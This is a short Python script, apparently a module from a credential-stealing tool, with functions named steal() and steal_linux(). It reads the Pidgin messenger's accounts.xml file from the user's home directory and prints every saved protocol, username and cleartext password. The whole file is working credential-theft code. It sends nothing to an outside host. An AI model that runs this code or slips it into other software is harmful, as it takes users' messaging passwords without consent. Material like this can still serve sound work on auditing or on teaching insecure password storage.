import platform
# Until Windows/Mac OSX is available only Linux will import these
if platform.system() == "Linux":
	import os
	import xml.etree.ElementTree as xml

def steal():
	# Only Linux is supported for now
	if platform.system() == "Linux":
		# Get the accounts (Linux)
		steal_linux()
	else:
		print("[-] Only Linux is supported")
# Linux steal method
def steal_linux():
	# Get the path
	path = os.getenv("HOME") + "/.purple/accounts.xml"
	try:
		# Parse the XML
		root = xml.parse(path).getroot()
	except:
		# Uh,oh file not found
		print("[-] accounts.xml not found")
		return
	# Enumerate the accounts where password is present	
	for acc in root:
		# Check for password presence
		if acc[2].tag == "password":
			# The good/bad thing about Pidgin is that by default it stores cleartext passwords
			print("[+] Protocol:{proto}\n    Username:{us}\n    Password:{pw}\n".format(us=acc[1].text,pw=acc[2].text,proto=acc[0].text.split('prpl-')[1]))

